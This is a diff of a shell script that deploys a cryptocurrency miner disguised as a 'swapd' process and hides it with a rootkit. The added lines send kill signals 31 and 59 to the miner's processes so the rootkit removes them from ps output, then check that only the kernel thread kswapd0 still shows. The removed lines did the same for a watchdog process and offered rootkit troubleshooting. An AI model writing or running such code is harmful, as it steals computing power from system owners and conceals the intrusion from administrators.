@@ -3087,62 +3087,33 @@ else
     echo "[*] Waiting for processes to fully start..."
     sleep 5
     
-    echo "[*] Finding miner processes..."
+    echo "[*] Sending hide signals to miner processes..."
     
-    # Get all swapd PIDs (excluding kernel kswapd0)
-    MINER_PIDS=$(ps ax | grep -E 'swapd|config.json' | grep -v grep | grep -v '\[kswapd0\]' | awk '{print $1}')
+    # Use EXACTLY the user's commands
+    kill -31 $(pgrep -f -u root config.json)
+    kill -59 $(pgrep -f -u root config.json)
+    kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+    kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
     
-    if [ -z "$MINER_PIDS" ]; then
-        echo "[!] No miner processes found to hide"
+    sleep 2
+    
+    # Verify hiding worked
+    echo "[*] Verifying process visibility..."
+    STILL_VISIBLE=$(ps ax | grep -E 'swapd' | grep -v grep | grep -v '\[kswapd0\]')
+    
+    if [ -z "$STILL_VISIBLE" ]; then
+        echo "[✓] SUCCESS! All miner processes are now HIDDEN!"
+        echo ""
+        echo "Verification:"
+        echo "  ps ax | grep swapd → Only shows [kswapd0] (kernel thread) ✓"
     else
-        echo "[*] Found miner PIDs: $MINER_PIDS"
-        
-        # Send hide signals to each PID
-        for pid in $MINER_PIDS; do
-            echo "[*] Hiding PID $pid..."
-            kill -31 "$pid" 2>/dev/null || true
-            kill -59 "$pid" 2>/dev/null || true
-        done
-        
-        sleep 2
-        
-        # Verify hiding worked
-        echo "[*] Verifying process visibility..."
-        STILL_VISIBLE=$(ps ax | grep -E 'swapd|config.json' | grep -v grep | grep -v '\[kswapd0\]' | awk '{print $1}')
-        
-        if [ -z "$STILL_VISIBLE" ]; then
-            echo "[✓] SUCCESS! All miner processes are now HIDDEN!"
-            echo ""
-            echo "Verification:"
-            echo "  ps ax | grep swapd → Only shows [kswapd0] (kernel thread) ✓"
-        else
-            echo "[!] WARNING: Some processes still visible: $STILL_VISIBLE"
-            echo ""
-            echo "This may happen if:"
-            echo "  1. Rootkit isn't fully loaded"
-            echo "  2. Process restarted after hide signal"
-            echo "  3. Wrong signal for your rootkit"
-            echo ""
-            echo "Try manual hiding:"
-            echo "  kill -31 $STILL_VISIBLE"
-            echo "  kill -59 $STILL_VISIBLE"
-        fi
-    fi
-    
-    # Also hide watchdog if present
-    echo ""
-    echo "[*] Checking for watchdog process..."
-    WATCHDOG_PIDS=$(ps ax | grep 'system-watchdog' | grep -v grep | awk '{print $1}')
-    
-    if [ -n "$WATCHDOG_PIDS" ]; then
-        echo "[*] Found watchdog PIDs: $WATCHDOG_PIDS"
-        for pid in $WATCHDOG_PIDS; do
-            echo "[*] Hiding watchdog PID $pid..."
-            kill -31 "$pid" 2>/dev/null || true
-            kill -59 "$pid" 2>/dev/null || true
-        done
-        sleep 1
-        echo "[✓] Watchdog hide signals sent"
+        echo "[!] WARNING: Some processes still visible"
+        echo ""
+        echo "Manual fix:"
+        echo "  kill -31 \$(pgrep -f -u root config.json)"
+        echo "  kill -59 \$(pgrep -f -u root config.json)"
+        echo "  kill -31 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
+        echo "  kill -59 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
     fi
 fi
 
